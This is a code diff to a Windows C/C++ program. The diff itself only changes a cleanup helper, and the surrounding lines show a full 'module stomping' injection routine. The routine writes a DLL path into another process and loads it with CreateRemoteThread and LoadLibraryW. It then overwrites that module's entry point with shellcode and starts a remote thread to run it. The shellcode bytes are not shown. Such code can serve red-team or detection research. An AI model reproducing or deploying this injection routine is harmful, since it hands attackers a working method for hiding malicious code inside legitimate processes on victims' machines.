@@ -8,9 +8,7 @@ Resources:
 #include <stdio.h>
 #include <string>
 
-VOID FreeAll(HANDLE hProcess, LPVOID lpRemoteAddr, HMODULE hKernel32, HANDLE hThread) {
-	if (hKernel32)
-		CloseHandle(hKernel32);
+VOID FreeAll(HANDLE hProcess, LPVOID lpRemoteAddr, HANDLE hThread) {
 	if (lpRemoteAddr)
 		VirtualFreeEx(hProcess, lpRemoteAddr, 0, MEM_RELEASE);
 	if (hThread)
@@ -53,27 +51,27 @@ BOOL ModuleStomping() {
 
 	LPVOID lpRemoteAddr = VirtualAllocEx(hProcess, nullptr, sizeof(wModuleToInject), MEM_COMMIT, PAGE_READWRITE);
 	if (!lpRemoteAddr) {
-		FreeAll(hProcess, nullptr, nullptr, nullptr);
+		FreeAll(hProcess, nullptr, nullptr);
 		return FALSE;
 	}
 	if (!WriteProcessMemory(hProcess, lpRemoteAddr, (LPVOID)wModuleToInject, sizeof(wModuleToInject), nullptr)) {
-		FreeAll(hProcess, lpRemoteAddr, nullptr, nullptr);
+		FreeAll(hProcess, lpRemoteAddr, nullptr);
 		return FALSE;
 	}
 
 	HMODULE hKernel32 = GetModuleHandle(L"kernel32");
 	if (!hKernel32) {
-		FreeAll(hProcess, lpRemoteAddr, nullptr, nullptr);
+		FreeAll(hProcess, lpRemoteAddr, nullptr);
 		return FALSE;
 	}
 	PTHREAD_START_ROUTINE startRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
 	if (!startRoutine) {
-		FreeAll(hProcess, lpRemoteAddr, hKernel32, nullptr);
+		FreeAll(hProcess, lpRemoteAddr, nullptr);
 		return FALSE;
 	}
 	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, startRoutine, lpRemoteAddr, 0, nullptr);
 	if (!hThread) {
-		FreeAll(hProcess, lpRemoteAddr, hKernel32, nullptr);
+		FreeAll(hProcess, lpRemoteAddr, nullptr);
 		return FALSE;
 	}
 	WaitForSingleObject(hThread, 1000);
@@ -83,7 +81,7 @@ BOOL ModuleStomping() {
 	SIZE_T dwModulesSize = sizeof(modules);
 	DWORD dwModulesSizeNeeded;
 	if (!EnumProcessModules(hProcess, modules, dwModulesSize, &dwModulesSizeNeeded)) {
-		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
+		FreeAll(hProcess, lpRemoteAddr, hThread);
 		return FALSE;
 	}
 	SIZE_T dwModulesCnt = dwModulesSizeNeeded / sizeof(HMODULE);
@@ -100,7 +98,7 @@ BOOL ModuleStomping() {
 		}
 	}
 	if (!bFound || !hRemoteModule) {
-		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
+		FreeAll(hProcess, lpRemoteAddr, hThread);
 		return FALSE;
 	}
 
@@ -108,11 +106,11 @@ BOOL ModuleStomping() {
 	DWORD dwHdrBufSize = 0x1000;
 	LPVOID lpRemoteModule = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwHdrBufSize);
 	if (!lpRemoteModule) {
-		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
+		FreeAll(hProcess, lpRemoteAddr, hThread);
 		return FALSE;
 	}
 	if (!ReadProcessMemory(hProcess, hRemoteModule, lpRemoteModule, dwHdrBufSize, nullptr)) {
-		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
+		FreeAll(hProcess, lpRemoteAddr, hThread);
 		return FALSE;
 	}
 
@@ -120,25 +118,25 @@ BOOL ModuleStomping() {
 	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpRemoteModule + pDosHeader->e_lfanew);
 	LPVOID lpEntryPointRVA = (LPVOID)((DWORD_PTR)hRemoteModule + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 	if (!lpEntryPointRVA) {
-		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
+		FreeAll(hProcess, lpRemoteAddr, hThread);
 		return FALSE;
 	}
 
 	// Write shellcode to the entry point
 	SIZE_T dwBytesWritten;
 	if (!WriteProcessMemory(hProcess, lpEntryPointRVA, (LPCVOID)shellcode, sizeof(shellcode), &dwBytesWritten)) {
-		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
+		FreeAll(hProcess, lpRemoteAddr, hThread);
 		return FALSE;
 	}
 
 	// Execute shellcode from inside the target module.
 	CreateRemoteThread(hProcess, nullptr, 0, (PTHREAD_START_ROUTINE)lpEntryPointRVA, nullptr, 0, nullptr);
 	/*if (!hThread2) {
-		FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
+		FreeAll(hProcess, lpRemoteAddr, hThread);
 		return FALSE;
 	}*/
 
-	FreeAll(hProcess, lpRemoteAddr, hKernel32, hThread);
+	FreeAll(hProcess, lpRemoteAddr, hThread);
 
 	return TRUE;
 }
